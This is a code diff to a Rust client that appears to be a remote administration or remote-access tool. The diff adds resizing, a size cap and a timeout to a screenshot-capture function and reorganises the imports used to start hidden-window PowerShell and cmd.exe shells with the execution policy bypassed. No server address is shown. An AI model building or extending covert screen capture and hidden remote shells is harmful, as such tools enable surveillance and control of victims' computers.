@@ -22,7 +22,8 @@ use screenshots::Screen;
 use std::io::Cursor;
 use base64::{engine::general_purpose, Engine as _};
 use sysinfo::System;
-#[cfg(windows)] use std::os::windows::process::CommandExt;
+use image::{imageops::FilterType, GenericImageView};
+// CommandExt moved to inline usage to avoid unused warning
 #[cfg(windows)]
 const CREATE_NO_WINDOW: u32 = 0x08000000;
 
@@ -107,20 +108,50 @@ async fn download_file_as_base64(path: &Path) -> Result<String> {
 
 async fn capture_screenshot(display_index: Option<usize>) -> Result<String> {
     use tokio::task;
-    let b64 = task::spawn_blocking(move || {
+    use tokio::time::timeout;
+    
+    // 设置超时避免长时间阻塞，返回扁平化的Result
+    let task_handle = task::spawn_blocking(move || -> Result<String> {
         let screens = Screen::all().map_err(|e| anyhow!("list screens failed: {}", e))?;
         if screens.is_empty() { return Err(anyhow!("no screens found")); }
         let screen = match display_index {
             Some(idx) if idx < screens.len() => &screens[idx],
             _ => &screens[0],
         };
+        
         let rgba_img = screen.capture().map_err(|e| anyhow!("capture failed: {}", e))?;
+        let mut dyn_img = image::DynamicImage::ImageRgba8(rgba_img);
+        
+        // 限制截图尺寸避免过大数据导致传输失败
+        let (w, h) = dyn_img.dimensions();
+        let max_edge = 1200u32; // 最大边长限制
+        let max_dimension = w.max(h);
+        if max_dimension > max_edge {
+            let scale = max_edge as f32 / max_dimension as f32;
+            let new_w = (w as f32 * scale).round() as u32;
+            let new_h = (h as f32 * scale).round() as u32;
+            dyn_img = dyn_img.resize_exact(new_w, new_h, FilterType::Lanczos3);
+        }
+        
         let mut png_bytes = Vec::new();
-        image::DynamicImage::ImageRgba8(rgba_img)
-            .write_to(&mut Cursor::new(&mut png_bytes), image::ImageOutputFormat::Png)?;
-        Ok::<_, anyhow::Error>(general_purpose::STANDARD.encode(&png_bytes))
-    }).await??;
-    Ok(b64)
+        dyn_img.write_to(&mut Cursor::new(&mut png_bytes), image::ImageOutputFormat::Png)?;
+        
+        // 检查生成数据大小，避免过大
+        let b64 = general_purpose::STANDARD.encode(&png_bytes);
+        if b64.len() > 20 * 1024 * 1024 { // 20MB限制
+            return Err(anyhow!("screenshot too large: {} bytes", b64.len()));
+        }
+        
+        Ok(b64)
+    });
+    
+    match timeout(Duration::from_secs(30), task_handle).await {
+        Ok(join_result) => match join_result {
+            Ok(screenshot_result) => screenshot_result,
+            Err(join_err) => Err(anyhow!("task join error: {}", join_err)),
+        },
+        Err(_) => Err(anyhow!("screenshot timeout"))
+    }
 }
 
 impl Default for ClientConfig {
@@ -165,7 +196,11 @@ impl ShellManager {
             ShellKind::PowerShell => {
                 let mut cmd = Command::new("powershell.exe");
                 #[cfg(windows)]
-                { cmd.creation_flags(CREATE_NO_WINDOW); }
+                { 
+                    #[allow(unused_imports)]
+                    use std::os::windows::process::CommandExt;
+                    cmd.creation_flags(CREATE_NO_WINDOW); 
+                }
                 let mut child = cmd
                     .args(["-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass"]) // keep process alive
                     .stdin(Stdio::piped())
@@ -182,7 +217,11 @@ impl ShellManager {
             ShellKind::Cmd => {
                 let mut cmd = Command::new("cmd.exe");
                 #[cfg(windows)]
-                { cmd.creation_flags(CREATE_NO_WINDOW); }
+                { 
+                    #[allow(unused_imports)]
+                    use std::os::windows::process::CommandExt;
+                    cmd.creation_flags(CREATE_NO_WINDOW); 
+                }
                 let mut child = cmd
                     .arg("/Q") // no echo
                     .stdin(Stdio::piped())
@@ -292,7 +331,11 @@ impl ShellManager {
             ShellKind::PowerShell => {
                 let mut cmd = Command::new("powershell.exe");
                 #[cfg(windows)]
-                { cmd.creation_flags(CREATE_NO_WINDOW); }
+                { 
+                    #[allow(unused_imports)]
+                    use std::os::windows::process::CommandExt;
+                    cmd.creation_flags(CREATE_NO_WINDOW); 
+                }
                 let output = cmd
                     .args(["-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", command])
                     .output()
@@ -302,7 +345,11 @@ impl ShellManager {
             ShellKind::Cmd => {
                 let mut cmd = Command::new("cmd.exe");
                 #[cfg(windows)]
-                { cmd.creation_flags(CREATE_NO_WINDOW); }
+                { 
+                    #[allow(unused_imports)]
+                    use std::os::windows::process::CommandExt;
+                    cmd.creation_flags(CREATE_NO_WINDOW); 
+                }
                 let output = cmd
                     .args(["/C", command])
                     .output()
